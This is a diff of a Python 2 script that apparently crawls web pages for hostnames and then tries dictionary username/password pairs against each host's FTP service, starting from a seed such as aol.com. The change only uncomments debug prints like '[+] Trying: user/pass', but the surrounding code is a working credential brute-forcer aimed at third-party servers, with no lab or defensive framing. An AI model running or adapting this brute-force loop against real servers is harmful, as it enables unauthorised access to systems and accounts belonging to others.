@@ -20,15 +20,15 @@ hostset.add("http://www.aol.com/")
 def bruteLogin(dic):
     while True:
         if hosts.empty():
-#            print 'hosts empty'
+            print 'hosts empty'
             gevent.sleep(0)
             continue
         hostname=hosts.get()
-        #print hostname
+        print hostname
         
         for userName in dic.keys():
             passWord=dic[userName]
-            #print "[+] Trying: "+userName+"/"+passWord
+            print "[+] Trying: "+userName+"/"+passWord
             try:
                 with gevent.Timeout(10, False) as timeout:
                     ftp = ftplib.FTP(hostname)
@@ -40,7 +40,7 @@ def bruteLogin(dic):
                     ftp.quit()
             except Exception, e:
                 pass
-            #print 'login {0} wrong.'.format(hostname)
+            print 'login {0} wrong.'.format(hostname)
 
         
 def scanhost():
@@ -69,8 +69,8 @@ def scanhost():
                             print 'gethost:'+link[2]+str(e)
 
         except Exception,e:
-            #print 'urlopen:'+host+str(e)
-            pass
+            print 'urlopen:'+host+str(e)
+
 
 
 pF = open(passwdFile, 'r')
